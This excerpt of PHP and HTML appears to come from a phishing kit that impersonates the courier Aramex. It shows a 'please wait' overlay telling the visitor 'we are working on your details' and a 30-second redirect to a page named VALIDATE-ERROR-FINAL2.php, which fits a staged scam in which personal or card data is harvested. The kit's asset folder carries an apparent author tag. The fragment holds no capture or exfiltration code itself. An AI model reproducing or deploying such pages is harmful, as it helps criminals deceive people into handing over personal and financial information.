...
header("Refresh: 30; url=./VALIDATE-ERROR-FINAL2.php", true, 303);
?>
<!DOCTYPE html>
...
<head id="Head1">
    ...
    <link rel="stylesheet" type="text/css" href="./shanks-l9assir/bootstrap.css" media="screen">
    <link rel="stylesheet" type="text/css" href="./shanks-l9assir/main.css">
<title>Aramex Post</title>
    ...
    <script language="javascript" type="text/javascript"
            src="./shanks-l9assir/jquery-1.js"></script>
    <script language="javascript" type="text/javascript"
            src="./shanks-l9assir/jquery-1_002.js"></script>
    <script language="javascript" type="text/javascript"
            src="./shanks-l9assir/jquery-ui-1.js"></script>
                        ...
                        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                            <div class="load-container load">
                                <div class="loader"><br><br><br><br><br><br><br><br>
                                    ...
                                    <br>
                                    <span id="loading"><b>Be patient, we are working on your details.</b></span>
                                </div>
                                <img  width="99" height="99" src="./shanks-l9assir/carica.gif">
                            </div>
                        </div>
